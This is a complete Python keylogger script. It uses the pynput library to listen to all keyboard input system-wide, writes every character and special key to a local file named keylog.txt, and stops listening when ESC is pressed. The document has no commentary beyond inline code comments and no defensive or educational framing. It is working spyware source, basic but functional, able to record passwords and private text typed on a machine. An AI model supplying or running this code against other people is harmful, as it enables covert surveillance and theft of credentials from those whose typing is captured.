from pynput import keyboard

# Define a function to log the keystrokes
def on_press(key):
    try:
        # Convert the key to its character representation
        k = key.char
    except AttributeError:
        # If it's a special key (like space, enter, etc.)
        k = str(key)

    with open("keylog.txt", "a") as f:
        # Write the key to a file
        f.write(k)

# Define a function to stop logging (optional, triggered by a specific key, e.g., ESC)
def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
